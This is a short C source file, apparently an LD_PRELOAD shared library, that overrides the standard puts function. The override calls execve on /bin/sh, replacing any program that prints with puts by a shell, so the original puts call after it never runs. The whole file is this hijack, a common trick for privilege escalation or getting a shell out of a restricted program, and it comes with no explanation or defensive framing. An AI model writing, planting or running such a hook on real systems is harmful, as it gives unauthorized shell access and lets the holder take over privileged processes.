#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>

int puts(const char* s) {
      int (*original_puts) (const char*) = dlsym(RTLD_NEXT, "puts");
      execve("/bin/sh",0,0);
        return original_puts("Hello, puts!");
}
